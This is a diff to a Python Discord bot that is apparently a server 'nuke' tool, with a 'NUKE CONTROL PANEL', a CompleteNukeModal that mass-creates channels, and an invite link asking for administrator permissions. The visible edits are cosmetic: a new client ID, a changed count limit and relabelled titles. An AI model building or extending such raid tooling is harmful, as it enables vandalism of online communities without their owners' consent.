@@ -173,7 +173,7 @@ class SelectGuildButton(discord.ui.View):
         super().__init__()
         self.user_id = user_id
 
-        invite_url = "https://discord.com/oauth2/authorize?client_id=1515778808643588276&permissions=8&scope=bot"
+        invite_url = "https://discord.com/oauth2/authorize?client_id=1516407479356100668"
         self.add_item(discord.ui.Button(label="INVITE BOT", style=discord.ButtonStyle.link, url=invite_url))
 
     async def interaction_check(self, interaction: discord.Interaction) -> bool:
@@ -431,7 +431,7 @@ class CompleteNukeModal(discord.ui.Modal):
             if channel_count <= 0 or channel_count > 1000:
                 embed = discord.Embed(
                     title="ERROR",
-                    description="Count must be 1-1000",
+                    description="Count must be 1-999",
                     color=discord.Color.red()
                 )
                 await interaction.followup.send(embed=embed, ephemeral=True)
@@ -909,7 +909,7 @@ async def removeauth_command(interaction: discord.Interaction, user_id: str):
 
     if interaction.user.id != OWNER_ID:
         embed = discord.Embed(
-            title="ERROR - OWNER ONLY",
+            title="ERROR - Flag OWNER ONLY",
             description=f"Only owner can use this!",
             color=discord.Color.red()
         )
@@ -1071,7 +1071,7 @@ async def panel_command(interaction: discord.Interaction):
 
     embed = discord.Embed(
         title="NUKE CONTROL PANEL",
-        description="PREMIUM VERSION",
+        description="PREMIUM Flag OG ",
         color=discord.Color.from_rgb(255, 0, 0)
     )
 
